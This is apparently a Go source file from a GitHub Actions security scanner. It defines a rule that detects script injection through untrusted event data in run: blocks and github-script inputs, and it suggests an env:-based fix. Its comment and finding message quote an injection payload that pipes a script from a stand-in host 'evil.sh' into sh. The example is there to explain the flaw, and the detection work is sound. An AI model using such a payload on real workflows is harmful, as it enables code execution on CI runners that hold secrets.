package rules

import (
	"fmt"
	"strings"

	"github.com/mdryaaan/pipelinesentinel/internal/finding"
	"github.com/mdryaaan/pipelinesentinel/internal/parser"
	"github.com/mdryaaan/pipelinesentinel/internal/utils"
)

// ScriptInjectionRule flags untrusted input interpolated into a shell.
type ScriptInjectionRule struct{}

// NewScriptInjectionRule builds the rule.
func NewScriptInjectionRule() *ScriptInjectionRule { return &ScriptInjectionRule{} }

// ID returns the rule identifier.
func (r *ScriptInjectionRule) ID() finding.RuleID { return finding.RuleScriptInjection }

// Description summarises the rule.
func (r *ScriptInjectionRule) Description() string {
	return "Untrusted `github.event.*` values must reach a shell through env:, never inlined into run:."
}

// Check flags `${{ }}` expressions over untrusted context inside a `run:` body.
//
// Expressions are substituted textually *before* the shell sees the script, so
// an issue titled `"; curl evil.sh | sh; #` becomes a command. Routing the value
// through `env:` and referencing `$VAR` avoids this entirely, because the shell
// then treats it as data.
//
// Severity depends on the trigger. Under `pull_request_target` or
// `issue_comment` the attacker is any GitHub user and the job holds real
// secrets, so it is critical; on `push` only someone with write access can
// reach it, which is a far weaker position.
func (r *ScriptInjectionRule) Check(wf *parser.Workflow) []finding.Finding {
	var out []finding.Finding

	trigger, untrustedTrigger := r.riskiestTrigger(wf)

	for _, job := range wf.Jobs {
		for _, step := range job.Steps {
			out = append(out, r.checkRun(wf, job, step, trigger, untrustedTrigger)...)
			out = append(out, r.checkScriptInput(wf, job, step, trigger, untrustedTrigger)...)
		}
	}

	return out
}

// checkRun scans a shell script body line by line.
//
// Line by line rather than over the whole body, because a `${{ }}` inside a
// shell comment is inert — the shell never evaluates it — and flagging one
// teaches people that this rule cries wolf.
func (r *ScriptInjectionRule) checkRun(
	wf *parser.Workflow, job parser.Job, step parser.Step, trigger string, untrusted bool,
) []finding.Finding {
	if step.Run.Empty() {
		return nil
	}

	var out []finding.Finding
	for offset, line := range strings.Split(step.Run.Value, "\n") {
		if strings.HasPrefix(strings.TrimSpace(line), "#") {
			continue
		}

		for _, expr := range expressions(line) {
			hits := untrustedIn(expr)
			if len(hits) == 0 {
				continue
			}
			out = append(out, r.newFinding(wf, job, step,
				parser.LineOffset(step.RunBodyPos, offset), expr, hits[0], trigger, untrusted, "run block"))
		}
	}
	return out
}

// scriptInputs are action inputs whose value is executed as code.
//
// actions/github-script is the common one: its `script:` input is evaluated as
// JavaScript inside the runner, so interpolating an issue title into it is the
// same vulnerability as interpolating it into a shell — and it is easy to miss,
// because there is no `run:` anywhere in sight.
var scriptInputs = map[string]string{
	"actions/github-script": "script",
}

func (r *ScriptInjectionRule) checkScriptInput(
	wf *parser.Workflow, job parser.Job, step parser.Step, trigger string, untrusted bool,
) []finding.Finding {
	if step.Uses.Empty() {
		return nil
	}

	name := step.Uses.Value
	if at := strings.LastIndex(name, "@"); at >= 0 {
		name = name[:at]
	}
	input, ok := scriptInputs[name]
	if !ok {
		return nil
	}

	value, ok := step.With[input]
	if !ok || value.Empty() {
		return nil
	}

	var out []finding.Finding
	for offset, line := range strings.Split(value.Value, "\n") {
		if strings.HasPrefix(strings.TrimSpace(line), "//") {
			continue
		}
		for _, expr := range expressions(line) {
			hits := untrustedIn(expr)
			if len(hits) == 0 {
				continue
			}
			at := parser.LineOffset(value.Body, offset)
			out = append(out, r.newFinding(wf, job, step, at, expr, hits[0], trigger, untrusted,
				fmt.Sprintf("`%s` input of `%s`", input, name)))
		}
	}
	return out
}

// newFinding builds one script-injection finding.
func (r *ScriptInjectionRule) newFinding(
	wf *parser.Workflow, job parser.Job, step parser.Step,
	line int, expr, context, trigger string, untrusted bool, where string,
) finding.Finding {
	raw := "${{ " + expr + " }}"
	source := wf.LineAt(line)

	severity := finding.High
	confidence := finding.Certain
	if !untrusted {
		// Reachable only by someone who can already push, so exploitability
		// genuinely depends on context the rule cannot see. This is what the
		// reasoning pass exists to adjudicate.
		severity = finding.Medium
		confidence = finding.Ambiguous
	} else if trigger == "pull_request_target" || trigger == "issue_comment" {
		severity = finding.Critical
	}

	envName := suggestEnvName(context)
	fixed := strings.Replace(source, raw, "$"+envName, 1)

	return finding.Finding{
		RuleID:   r.ID(),
		Severity: severity,
		File:     wf.File,
		Line:     line,
		Job:      job.ID.Value,
		Step:     stepLabel(step),
		Title:    fmt.Sprintf("Untrusted %s interpolated into a %s", context, where),
		Detail: fmt.Sprintf(
			"`%s` is expanded into the %s before anything parses it, so a value such as "+
				"`\"; curl evil.sh | sh; #` becomes code rather than text. This workflow is "+
				"triggered by `%s`. Pass the value through `env:` and reference `$%s` instead, "+
				"which is read as data.",
			raw, where, trigger, envName),
		Snippet:    wf.Snippet(line, 2),
		Confidence: confidence,
		Fix: utils.UnifiedDiff(wf.File, line, source, fixed) +
			fmt.Sprintf("\n# and add to the step:\n#   env:\n#     %s: %s\n", envName, raw),
		References: []string{
			"https://securitylab.github.com/resources/github-actions-untrusted-input/",
		},
	}
}

// riskiestTrigger returns the workflow's most dangerous trigger and whether it
// is attacker-influenced.
func (r *ScriptInjectionRule) riskiestTrigger(wf *parser.Workflow) (string, bool) {
	// Ordered by how much access an attacker needs, least first.
	priority := []string{"pull_request_target", "issue_comment", "issues", "discussion_comment",
		"discussion", "workflow_run", "pull_request"}

	for _, want := range priority {
		if wf.HasTrigger(want) {
			return want, untrustedTriggers[want] || want == "pull_request"
		}
	}
	if len(wf.Triggers) > 0 {
		return wf.Triggers[0].Value, false
	}
	return "unknown", false
}

// suggestEnvName turns a context path into a conventional env var name.
func suggestEnvName(ctx string) string {
	parts := strings.Split(ctx, ".")
	if len(parts) < 2 {
		return "UNTRUSTED_INPUT"
	}
	tail := parts[len(parts)-2:]
	name := strings.ToUpper(strings.Join(tail, "_"))
	return strings.ReplaceAll(name, "-", "_")
}
